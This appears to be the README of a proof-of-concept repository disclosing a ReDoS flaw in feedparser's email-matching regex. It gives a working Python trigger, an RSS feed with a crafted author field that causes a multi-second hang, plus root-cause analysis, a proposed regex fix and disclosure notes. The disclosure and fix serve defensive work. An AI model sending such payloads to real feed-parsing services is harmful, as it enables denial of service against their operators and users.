# feedparser ReDoS PoC (`_sync_author_detail()`)

Minimal, deterministic proof-of-concept for a **Regular Expression Denial of
Service (ReDoS, CWE-1333)** in
[feedparser](https://pypi.org/project/feedparser/)'s email-extraction regex
inside `_sync_author_detail()` (`feedparser/mixin.py`, regex at line 746).

## Affected

- **feedparser <= 6.0.12** (latest release, verified locally vulnerable)
- Network-reachable, no authentication: a malicious RSS/Atom `<author>` field
  triggers catastrophic backtracking (≈ O(n²)) in `feedparser.parse()`.

## Reproduce

```bash
pip install feedparser==6.0.12
python redos_poc.py
```

Expected: the isolated regex and the end-to-end `feedparser.parse()` timings
grow super-linearly with input size (~9× slower when input triples; ~282×
slower end-to-end at 5400 segments vs a normal feed). See `repro_2026-08-05.txt`
for a captured run.

## Minimal trigger

```python
import feedparser
evil = 'user@' + ('a-b.' * 5400) + '!'
feed = ('<?xml version="1.0"?><rss version="2.0">'
        '<channel><title>x</title><item><title>t</title>'
        f'<author>{evil}</author></item></channel></rss>')
feedparser.parse(feed)   # ~3 second hang
```

## Root cause

The domain part of the email regex contains a nested quantifier:

```
(([a-zA-Z0-9\-]+\.)+)([a-zA-Z]{2,4}|[0-9]{1,3})
```

For an input like `user@a-b.a-b....!` (labels terminated by `!` so the trailing
TLD group never matches), the backtracking engine enumerates every possible
dot-split before failing.

## Fix

Replace the nested quantifier `(([a-zA-Z0-9\-]+\.)+)` with a flat class
`([a-zA-Z0-9\-.]+)`; also cap the `author` length before matching.

## Disclosure

This issue was previously reported publicly on 2026-04-19 in
[kurtmckee/feedparser#562](https://github.com/kurtmckee/feedparser/issues/562).
This repository provides an **independent, deterministically-reproduced
verification** and supports a coordinated CVE submission. No CVE is currently
assigned to feedparser for this ReDoS. **Responsible disclosure only — no
weaponized exploit.**
